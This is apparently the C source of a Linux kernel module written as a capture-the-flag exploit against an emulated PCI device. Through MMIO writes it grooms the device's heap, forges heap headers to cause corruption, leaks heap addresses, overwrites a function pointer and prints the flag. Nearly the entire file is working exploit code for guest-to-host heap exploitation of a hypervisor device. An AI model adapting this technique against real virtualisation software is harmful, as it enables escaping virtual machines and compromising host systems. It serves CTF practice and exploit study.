#include <linux/module.h>
#include <linux/ioport.h>
#include <linux/slab.h>
#include <asm/io.h>

MODULE_LICENSE("GPL");

#define virt_to_phys(a) ((unsigned long)__pa(a))
#define phys_to_virt(a) __va(a)

#define VDA_IOMEM_BASE (0xfeb80000)
#define VDB_IOMEM_BASE (0xfebf0000)
#define IOMEM_LEN (0x3ffff)

#define VDA_PORT (0xc000)
#define VDB_PORT (0xc100)

#define BLOCK_SIZE 0x40000

int m_init(void)
{
    printk("m_init\n");
    void * piomem = ioremap(VDA_IOMEM_BASE, 0x1000);
    int i = 0;

    writel(BLOCK_SIZE, piomem+0x4); // set size
    for (i = 0; i < 0x20; i++) {
	writel(i, piomem+4*2); // alloc
    }

    writel(0x100, piomem+0x4); // set size
    for (i = 0x100; i < 0x200; i++) {
	writel(i, piomem+4*2); // alloc
    }
    writel(BLOCK_SIZE-0x110, piomem+0x4);
    writel(0x20-8, piomem+4*3); // free
    writel(0x20-8, piomem+4*2);
    writel(0x100, piomem+4);
    writel(0x20+1, piomem+4*2);

    writel(0x300, piomem+0x4); // set size
    for (i = 0x300; i < 0x400; i++) {
	writel(i, piomem+4*2); // alloc
    }
    writel(BLOCK_SIZE-0x110-0x310, piomem+0x4);
    writel(0x20-8, piomem+4*3); // free
    writel(0x20-8, piomem+4*2);
    writel(0x300, piomem+4);
    writel(0x20+2, piomem+4*2);

    writel(0x200, piomem+0x4); // set size
    for (i = 0x200; i < 0x300; i++) {
	writel(i, piomem+4*2); // alloc
    }
    writel(BLOCK_SIZE-0x110-0x310-0x210, piomem+4);
    writel(0x20-8, piomem+4*3); // free
    writel(0x20-8, piomem+4*2);
    writel(0x200, piomem+4);
    writel(0x20+3, piomem+4*2);

    writel(0x100, piomem+0x4); // set size
    for (i = 0x400; i < 0x500; i++) {
	writel(i, piomem+4*2); // alloc
    }
    writel(0x200, piomem+4); // set size
    for (i = 0x500; i < 0x600; i++) {
	writel(i, piomem+4*2); // alloc
    }

    writel(0x200, piomem+4*6);
    writel(0x20+1, piomem+4*3); // free
    writel(0x20+3, piomem+4*3); // free
    writel(0, piomem+0x4*4);

    // Triger the bug
    struct {
	uint32_t offset;
	uint32_t size;
	uint32_t readback_addr;
	uint32_t block_id;
	uint64_t heapheader[2];
	uint32_t hsize;
	uint32_t hoffset;
	uint64_t hframe_buff;
	uint64_t hget_flag;
	uint64_t hwrite;
    } *reader = kzalloc(0x1000, GFP_KERNEL);

    reader->offset = 0x100-0x40+0x18;
    reader->size = 0x200+0x40-0x18;
    reader->readback_addr = virt_to_phys(reader)+0x100;
    reader->block_id = 0x20+4;
    reader->heapheader[0] = 0;
    reader->heapheader[1] = 0x115;
    reader->hsize = 0x200+0x310+0x10+0x20;
    reader->hoffset = 0x40;

    writel(0x240, piomem+4);
    writel(0x24, piomem+4*2);
    writel(0x25, piomem+4*2);

    writel(0x40, piomem+0x4*7); // header->offset
    writel(virt_to_phys(reader)+0x10+0x18-0x200, piomem+0x4*8);
    writel(0x24, piomem+4*10); // frame_buff store

    writel(0x300, piomem+4); // set size
    for (i = 0x700; i < 0x800; i++) {
	writel(i, piomem+4*2); // alloc
    }

    writel(0x20+2, piomem+4*3); // free
    writel(virt_to_phys(reader), piomem+4*12);

    writel(0x300, piomem+4); // set size
    writel(0x20+2, piomem+4*2); // alloc

    writel(0, piomem+0x4*7); // header->offset
    writel(0, piomem+4*10); // frame_buff store
    reader->offset = 0;
    reader->size = 0x200+0x310+0x10+0x20;
    reader->readback_addr = virt_to_phys(reader)+0x100;
    reader->block_id = 0;
    writel(virt_to_phys(reader), piomem+4*12);

    u64 fheader_buff_addr = *(u64*)((void*)reader+0x100+reader->hsize-0x18);
    u64 fheader_write_addr = fheader_buff_addr+0x200+0x310+0x10+0x18;
    u64 fheader_get_flag_addr = *(u64*)((void*)reader+0x100+reader->hsize-0x10);
    printk("this is the buff_addr: 0x%lx\n", fheader_buff_addr);
    printk("this is the write_addr: 0x%lx\n", fheader_write_addr);
    printk("this is the get_flag_addr 0x%lx\n", fheader_get_flag_addr);

    reader->offset = 0x100-0x10;
    reader->size = 0x200+0x10;
    reader->readback_addr = virt_to_phys(reader)+0x100;
    reader->block_id = 0x25;
    reader->heapheader[0] = 0;
    reader->heapheader[1] = 0x115;
    reader->hsize = 0x200;
    reader->hoffset = 0x40;
    reader->hframe_buff = fheader_buff_addr;
    reader->hget_flag = fheader_get_flag_addr;
    reader->hwrite = fheader_get_flag_addr;

    writel(0, piomem+0x4*5);
    writel(0, piomem+0x4*4);

    writel(0x40, piomem+0x4*7); // header->offset
    writel(virt_to_phys(reader)+0x10+0x30-0x200, piomem+0x4*8);
    writel(0x25, piomem+4*10); // frame_buff store

    writel(0x20+2, piomem+4*3); // free
    writel(virt_to_phys(reader), piomem+4*12);

    writel(0x300, piomem+4); // set size
    writel(0x20+2, piomem+4*2); // alloc

    writel(0, piomem+4*11);
    writel(virt_to_phys(reader)+0x100, piomem+4*9); 
    printk("this is the flag{%s}\n", (char*)((void*)reader+0x100));
    kfree(reader);

    iounmap(piomem);
    return 0;
}

void m_exit(void)
{
    printk("m_exit\n");
}

module_init(m_init);
module_exit(m_exit);
